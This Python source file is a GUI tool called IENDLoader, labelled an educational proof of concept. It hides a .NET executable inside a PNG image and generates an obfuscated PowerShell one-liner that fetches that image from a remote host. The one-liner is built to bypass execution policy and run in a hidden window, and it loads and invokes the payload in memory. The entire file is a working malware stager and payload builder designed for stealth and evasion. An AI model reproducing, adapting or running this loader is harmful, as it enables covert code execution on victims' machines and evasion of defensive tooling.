#!/usr/bin/env python3
"""
IENDLoader - Modern UI Edition
Educational PoC - Stealthy payload delivery interface with sleek animations
"""

import customtkinter as ctk
from tkinter import filedialog, messagebox
import base64
import threading
from pathlib import Path
import socket
import time
import random
import string

# Set appearance
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class IENDLoaderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        # Window setup
        self.title("IENDLoader")
        self.geometry("800x650")
        self.resizable(True, True)
        self.minsize(700, 550)  # Minimum size to keep UI usable
        
        # State
        self.payload_path = None
        self.image_path = None
        self.weaponized_path = None
        self.animation_running = False
        self.auto_entry_point = True  # Toggle for automatic entry point discovery
        self.custom_entry_point = ""  # Custom entry point if manual
        
        self.setup_ui()
        
    def setup_ui(self):
        """Create modern UI with animations"""
        
        # Header Frame
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(pady=20, padx=20, fill="x")
        
        # Animated title
        self.title_label = ctk.CTkLabel(
            header_frame,
            text="IENDLOADER",
            font=ctk.CTkFont(size=32, weight="bold"),
            text_color=("#00ff00", "#00cc00")
        )
        self.title_label.pack(pady=(5, 0), anchor="center", expand=True)
        
        self.subtitle_label = ctk.CTkLabel(
        header_frame,
        text="Hide .NET Stubs in PNGs",
        font=ctk.CTkFont(size=14),
        text_color=("#888888", "#666666"),
        justify="center")
        self.subtitle_label.pack(pady=(5, 0), anchor="center", expand=True)
        
        # Scrollable frame for main content
        scrollable_frame = ctk.CTkScrollableFrame(
            self,
            fg_color="transparent",
            scrollbar_button_color=("#2b2b2b", "#1a1a1a"),
            scrollbar_button_hover_color=("#3b3b3b", "#2a2a2a")
        )
        scrollable_frame.pack(pady=10, padx=30, fill="both", expand=True)
        
        # Main container inside scrollable frame
        main_container = scrollable_frame
        
        # Step 1: Select Payload
        self.create_step_frame(
            main_container,
            "1. Select .NET Assembly",
            "Choose your payload executable"
        )
        
        payload_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        payload_frame.pack(pady=(0, 20), fill="x")
        
        self.payload_label = ctk.CTkLabel(
            payload_frame,
            text="No payload selected",
            font=ctk.CTkFont(size=12),
            text_color=("#666666", "#444444")
        )
        self.payload_label.pack(side="left", padx=15, pady=15)
        
        self.payload_btn = ctk.CTkButton(
            payload_frame,
            text="Browse",
            command=self.select_payload,
            width=100,
            height=32,
            corner_radius=6
        )
        self.payload_btn.pack(side="right", padx=15, pady=15)
        
        # Step 2: Select Image
        self.create_step_frame(
            main_container,
            "2. Select Cover Image",
            "PNG file to hide the payload"
        )
        
        image_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        image_frame.pack(pady=(0, 20), fill="x")
        
        self.image_label = ctk.CTkLabel(
            image_frame,
            text="No image selected",
            font=ctk.CTkFont(size=12),
            text_color=("#666666", "#444444")
        )
        self.image_label.pack(side="left", padx=15, pady=15)
        
        self.image_btn = ctk.CTkButton(
            image_frame,
            text="Browse",
            command=self.select_image,
            width=100,
            height=32,
            corner_radius=6
        )
        self.image_btn.pack(side="right", padx=15, pady=15)
        
        # Step 3: Embed
        self.create_step_frame(
            main_container,
            "3. Create Weaponized Image",
            "Embed payload into cover image"
        )
        
        embed_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        embed_frame.pack(pady=(0, 20), fill="x")
        
        self.embed_btn = ctk.CTkButton(
            embed_frame,
            text="⚙ Embed Payload",
            command=self.embed_payload,
            width=150,
            height=36,
            corner_radius=6,
            font=ctk.CTkFont(size=13, weight="bold")
        )
        self.embed_btn.pack(side="left", padx=15, pady=15)
        
        self.embed_status = ctk.CTkLabel(
            embed_frame,
            text="",
            font=ctk.CTkFont(size=12),
            text_color=("#666666", "#444444")
        )
        self.embed_status.pack(side="left", padx=10, pady=15)
        
        # Progress bar (hidden initially)
        self.progress_bar = ctk.CTkProgressBar(
            embed_frame,
            width=200,
            height=8,
            corner_radius=4
        )
        self.progress_bar.set(0)
        
        # Step 3.5: Entry Point Configuration
        self.create_step_frame(
            main_container,
            "3.5 Entry Point Configuration",
            "Configure how to find the payload entry point"
        )
        
        entrypoint_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        entrypoint_frame.pack(pady=(0, 20), fill="x")
        
        # Toggle switch for auto-discovery
        toggle_container = ctk.CTkFrame(entrypoint_frame, fg_color="transparent")
        toggle_container.pack(side="left", padx=15, pady=15)
        
        ctk.CTkLabel(
            toggle_container,
            text="Auto-discover entry point:",
            font=ctk.CTkFont(size=12),
            text_color=("#cccccc", "#aaaaaa")
        ).pack(side="left", padx=(0, 10))
        
        self.entry_point_switch = ctk.CTkSwitch(
            toggle_container,
            text="",
            command=self.toggle_entry_point,
            width=50,
            height=24
        )
        self.entry_point_switch.select()  # Default: ON
        self.entry_point_switch.pack(side="left")
        
        # Manual entry point input (hidden by default)
        self.entry_point_input_frame = ctk.CTkFrame(entrypoint_frame, fg_color="transparent")
        
        ctk.CTkLabel(
            self.entry_point_input_frame,
            text="Entry Point:",
            font=ctk.CTkFont(size=12),
            text_color=("#cccccc", "#aaaaaa")
        ).pack(side="left", padx=(15, 5))
        
        self.entry_point_entry = ctk.CTkEntry(
            self.entry_point_input_frame,
            placeholder_text="e.g., Client.Program.Main",
            width=250,
            height=32,
            corner_radius=6,
            font=ctk.CTkFont(size=11)
        )
        self.entry_point_entry.pack(side="left", padx=5)
        
        # Step 4: Image URL
        self.create_step_frame(
            main_container,
            "4. Hosted Image URL",
            "Enter the URL where weaponized image is hosted"
        )
        
        url_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        url_frame.pack(pady=(0, 20), fill="x")
        
        self.url_entry = ctk.CTkEntry(
            url_frame,
            placeholder_text="http://192.168.1.100:8080/weaponized.png",
            height=36,
            corner_radius=6,
            font=ctk.CTkFont(size=12)
        )
        self.url_entry.pack(side="left", padx=15, pady=15, fill="x", expand=True)
        
        # Auto-fill button
        self.autofill_btn = ctk.CTkButton(
            url_frame,
            text="Auto-fill",
            command=self.autofill_url,
            width=100,
            height=32,
            corner_radius=6
        )
        self.autofill_btn.pack(side="right", padx=15, pady=15)
        
        # Step 5: One-Liner
        self.create_step_frame(
            main_container,
            "5. PowerShell One-Liner",
            "Base64 encoded command - no script file required"
        )
        
        cmd_frame = ctk.CTkFrame(main_container, fg_color=("#2b2b2b", "#1a1a1a"))
        cmd_frame.pack(pady=(0, 10), fill="both", expand=True)
        
        self.cmd_textbox = ctk.CTkTextbox(
            cmd_frame,
            height=100,
            corner_radius=6,
            font=ctk.CTkFont(family="Consolas", size=10),
            fg_color=("#1a1a1a", "#0a0a0a"),
            wrap="word"
        )
        self.cmd_textbox.pack(padx=15, pady=15, fill="both", expand=True)
        self.cmd_textbox.insert("1.0", "Click 'Generate PowerShell One-Liner' button below...")
        self.cmd_textbox.configure(state="disabled")
        
        # Button container
        button_container = ctk.CTkFrame(cmd_frame, fg_color="transparent")
        button_container.pack(padx=15, pady=(0, 15))
        
        # Generate button
        self.generate_btn = ctk.CTkButton(
            button_container,
            text="⚡ Generate PowerShell One-Liner",
            command=self.generate_command,
            width=250,
            height=36,
            corner_radius=6,
            font=ctk.CTkFont(size=13, weight="bold"),
            fg_color=("#0066cc", "#0055aa"),
            hover_color=("#0088ff", "#0066cc")
        )
        self.generate_btn.pack(side="left", padx=(0, 10))
        
        # Copy button
        self.copy_btn = ctk.CTkButton(
            button_container,
            text="📋 Copy to Clipboard",
            command=self.copy_command,
            width=180,
            height=36,
            corner_radius=6,
            font=ctk.CTkFont(size=13, weight="bold"),
            fg_color=("#00aa00", "#008800"),
            hover_color=("#00cc00", "#00aa00")
        )
        self.copy_btn.pack(side="left")
        
        # Status bar
        self.status_bar = ctk.CTkLabel(
            self,
            text="Ready",
            font=ctk.CTkFont(size=11),
            text_color=("#00ff00", "#00cc00"),
            anchor="w"
        )
        self.status_bar.pack(side="bottom", fill="x", padx=20, pady=10)
        
    def create_step_frame(self, parent, title, description):
        """Create a step header with title and description"""
        step_frame = ctk.CTkFrame(parent, fg_color="transparent")
        step_frame.pack(pady=(10, 5), fill="x")
        
        title_label = ctk.CTkLabel(
            step_frame,
            text=title,
            font=ctk.CTkFont(size=15, weight="bold"),
            text_color=("#00ff00", "#00cc00"),
            anchor="w"
        )
        title_label.pack(anchor="w")
        
        desc_label = ctk.CTkLabel(
            step_frame,
            text=description,
            font=ctk.CTkFont(size=11),
            text_color=("#888888", "#666666"),
            anchor="w"
        )
        desc_label.pack(anchor="w")
    
    def toggle_entry_point(self):
        """Toggle between auto-discovery and manual entry point"""
        self.auto_entry_point = self.entry_point_switch.get()
        
        if self.auto_entry_point:
            # Hide manual input
            self.entry_point_input_frame.pack_forget()
            self.update_status("✓ Auto-discovery enabled")
        else:
            # Show manual input
            self.entry_point_input_frame.pack(side="left", padx=15, pady=15)
            self.update_status("⚠ Manual entry point - specify target method")
    
    def select_payload(self):
        """Select .NET assembly payload"""
        path = filedialog.askopenfilename(
            title="Select .NET Assembly",
            filetypes=[("Executable files", "*.exe"), ("DLL files", "*.dll"), ("All files", "*.*")]
        )
        if path:
            self.payload_path = path
            filename = Path(path).name
            self.payload_label.configure(text=filename, text_color=("#00ff00", "#00cc00"))
            self.update_status(f"✓ Payload selected: {filename}")
            self.animate_button(self.payload_btn)
    
    def select_image(self):
        """Select cover image"""
        path = filedialog.askopenfilename(
            title="Select Cover Image",
            filetypes=[("PNG files", "*.png"), ("All files", "*.*")]
        )
        if path:
            self.image_path = path
            filename = Path(path).name
            self.image_label.configure(text=filename, text_color=("#00ff00", "#00cc00"))
            self.update_status(f"✓ Image selected: {filename}")
            self.animate_button(self.image_btn)
    
    def embed_payload(self):
        """Embed payload into image"""
        if not self.payload_path or not self.image_path:
            messagebox.showerror("Error", "Please select both payload and image first")
            return
        
        # Ask for output location
        default_name = f"weaponized_{Path(self.image_path).stem}.png"
        output_path = filedialog.asksaveasfilename(
            title="Save Weaponized Image",
            defaultextension=".png",
            initialfile=default_name,
            filetypes=[("PNG files", "*.png")]
        )
        
        if not output_path:
            return
        
        # Show progress bar
        self.progress_bar.pack(side="left", padx=10, pady=15)
        self.embed_status.configure(text="Embedding...", text_color=("#ffaa00", "#ff8800"))
        
        # Run embedding in thread
        thread = threading.Thread(target=self._embed_thread, args=(output_path,))
        thread.daemon = True
        thread.start()
    
    def _embed_thread(self, output_path):
        """Thread for embedding operation with progress animation"""
        try:
            # Animate progress
            for i in range(0, 50, 10):
                self.progress_bar.set(i / 100)
                time.sleep(0.1)
            
            # Read image
            with open(self.image_path, 'rb') as f:
                image_data = f.read()
            
            self.progress_bar.set(0.6)
            
            # Read payload
            with open(self.payload_path, 'rb') as f:
                payload_data = f.read()
            
            self.progress_bar.set(0.7)
            
            # Base64 encode
            encoded_payload = base64.b64encode(payload_data).decode('ascii')
            
            self.progress_bar.set(0.8)
            
            # Create marker-wrapped payload
            embedded_data = f"BaseStart-{encoded_payload}-BaseEnd"
            
            # Combine
            weaponized_image = image_data + embedded_data.encode('ascii')
            
            self.progress_bar.set(0.9)
            
            # Write output
            with open(output_path, 'wb') as f:
                f.write(weaponized_image)
            
            self.progress_bar.set(1.0)
            time.sleep(0.3)
            
            self.weaponized_path = output_path
            
            # Update UI
            self.after(0, lambda: self.embed_status.configure(
                text=f"✓ {Path(output_path).name}", 
                text_color=("#00ff00", "#00cc00")
            ))
            self.after(0, lambda: self.update_status(
                f"✓ Weaponized image created: {Path(output_path).name}"
            ))
            self.after(0, lambda: self.progress_bar.pack_forget())
            self.after(0, lambda: self.animate_button(self.embed_btn))
            self.after(0, self.autofill_url)
            self.after(0, lambda: self.update_status("✓ Ready to generate PowerShell command"))
            
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Error", f"Embedding failed: {e}"))
            self.after(0, lambda: self.embed_status.configure(
                text="Failed", 
                text_color=("#ff0000", "#cc0000")
            ))
            self.after(0, lambda: self.progress_bar.pack_forget())
    
    def autofill_url(self):
        """Auto-fill URL with local IP and weaponized image filename"""
        if not self.weaponized_path:
            return
        
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "192.168.1.100"
        
        filename = Path(self.weaponized_path).name
        url = f"http://{local_ip}:8080/{filename}"
        
        self.url_entry.delete(0, "end")
        self.url_entry.insert(0, url)
    
    def generate_command(self):
        """Generate stealthy PowerShell one-liner"""
        url = self.url_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Missing URL", "Please enter the hosted image URL first")
            return
        
        self.update_status("⚡ Generating stealthy PowerShell command...")
        self.animate_button(self.generate_btn)
        
        # Generate random variable names for obfuscation
        def rand_var():
            return ''.join(random.choices(string.ascii_lowercase, k=2))
        
        v1, v2, v3, v4, v5, v6, v7, v8, v9 = [rand_var() for _ in range(9)]
        
        # Create obfuscated inline PowerShell script
        if self.auto_entry_point:
            # Auto-discovery mode with max stealth
            inline_script = f'''${v1}=New-Object Net.WebClient;${v1}.Encoding=[Text.Encoding]::UTF8;${v2}=${v1}.DownloadString('{url}');if(${v2}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{${v3}=$matches[1];${v4}=[Convert]::('From'+'Base'+'64String').Invoke(${v3});${v5}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${v4});${v6}=${v5}.EntryPoint;if(!${v6}){{${v5}.GetTypes()|%{{${v7}=$_;${v7}.GetMethods([Reflection.BindingFlags]'Static,Public,NonPublic')|?{{$_.Name-eq('Ma'+'in')}}|%{{${v6}=$_}}}}}};if(${v6}){{${v8}=${v6}.GetParameters();if(${v8}.Length-eq0){{${v6}.Invoke($null,$null)}}else{{${v6}.Invoke($null,@(,[string[]]@()))}}}}}}'''
        else:
            # Manual entry point mode with max stealth
            entry_point = self.entry_point_entry.get().strip()
            if not entry_point:
                entry_point = "Client.Program.Main"
            
            parts = entry_point.split('.')
            if len(parts) < 2:
                messagebox.showwarning("Invalid Entry Point", "Entry point must be in format: Namespace.Class.Method")
                return
            
            method_name = parts[-1]
            type_name = '.'.join(parts[:-1])
            
            inline_script = f'''${v1}=New-Object Net.WebClient;${v1}.Encoding=[Text.Encoding]::UTF8;${v2}=${v1}.DownloadString('{url}');if(${v2}-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){{${v3}=$matches[1];${v4}=[Convert]::('From'+'Base'+'64String').Invoke(${v3});${v5}=[Reflection.Assembly]::('Lo'+'ad').Invoke(${v4});${v6}=${v5}.GetType('{type_name}');if(${v6}){{${v7}=${v6}.GetMethod('{method_name}',[Reflection.BindingFlags]'Static,Public,NonPublic');if(${v7}){{${v8}=${v7}.GetParameters();if(${v8}.Length-eq0){{${v7}.Invoke($null,$null)}}else{{${v7}.Invoke($null,@(,[string[]]@()))}}}}}}}}'''
        
        # Use direct execution instead of EncodedCommand (stealthier)
        # Escape quotes for command line
        escaped_script = inline_script.replace('"', '`"')
        
        # Generate final command - no -EncodedCommand flag
        command = f'''powershell.exe -NoP -NonI -W 1 -Exec Bypass -Command "{escaped_script}"'''
        
        self.cmd_textbox.configure(state="normal")
        self.cmd_textbox.delete("1.0", "end")
        self.cmd_textbox.insert("1.0", command)
        self.cmd_textbox.configure(state="disabled")
        
        self.update_status("✓ PowerShell command generated successfully!")
    
    def copy_command(self):
        """Copy command to clipboard"""
        command = self.cmd_textbox.get("1.0", "end").strip()
        if command and not command.startswith('Click'):
            self.clipboard_clear()
            self.clipboard_append(command)
            self.update_status("✓ Command copied to clipboard")
            self.animate_button(self.copy_btn)
        else:
            messagebox.showwarning("Warning", "Generate the command first")
    
    def update_status(self, message):
        """Update status bar with animation"""
        self.status_bar.configure(text=message)
        # Pulse animation
        self.animate_status()
    
    def animate_button(self, button):
        """Animate button on action"""
        original_color = button.cget("fg_color")
        button.configure(fg_color=("#00ff00", "#00cc00"))
        self.after(200, lambda: button.configure(fg_color=original_color))
    
    def animate_status(self):
        """Pulse animation for status bar"""
        colors = [("#00ff00", "#00cc00"), ("#00cc00", "#00aa00"), ("#00ff00", "#00cc00")]
        for i, color in enumerate(colors):
            self.after(i * 100, lambda c=color: self.status_bar.configure(text_color=c))

def main():
    app = IENDLoaderApp()
    app.mainloop()

if __name__ == "__main__":
    main()
